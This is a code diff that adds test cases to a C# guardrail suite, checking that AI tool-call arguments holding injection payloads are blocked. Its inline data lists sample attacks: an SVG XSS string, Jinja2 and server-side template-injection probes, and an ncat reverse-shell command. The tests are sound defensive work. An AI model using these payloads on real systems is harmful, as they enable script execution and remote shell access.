@@ -29,6 +29,25 @@ public class ToolCallGuardrailRuleDetectionTests
         return (result, violation);
     }
 
+    // markup and template syntax that legitimately contains the characters a scan could stop at
+
+    [Theory]
+    [InlineData("<svg a=\"<\" onfocusin=alert(1)>", "SVG XSS")]
+    [InlineData("{{ {}.__class__.__mro__ }}", "Jinja2/Python template injection")]
+    [InlineData("{{ x {{ self.__init__ }}", "Jinja2/Python template injection")]
+    [InlineData("${ a ${ exec } }", "Server-side template injection")]
+    [InlineData("#{ a # b }", "Expression language injection")]
+    [InlineData("ncat nn 10.0.0.1 -e /bin/sh", "Reverse shell patterns")]
+    public async Task ShouldDetectMarkupAndTemplateInjection_WhenTheirBodiesHoldTheOpeningCharacter(string value, string expected)
+    {
+        var rule = new ToolCallGuardrailRule(new ToolCallGuardrailOptions { Categories = ToolCallInjectionCategory.All });
+
+        var (result, violation) = await EvaluateAsync(value, rule, tool: "render", argument: "template");
+
+        result.IsBlocked.Should().BeTrue();
+        violation!.Description.Should().Be(expected);
+    }
+
     // SSRF: every notation of a loopback, private, link-local or metadata address is the same host
 
     [Theory]
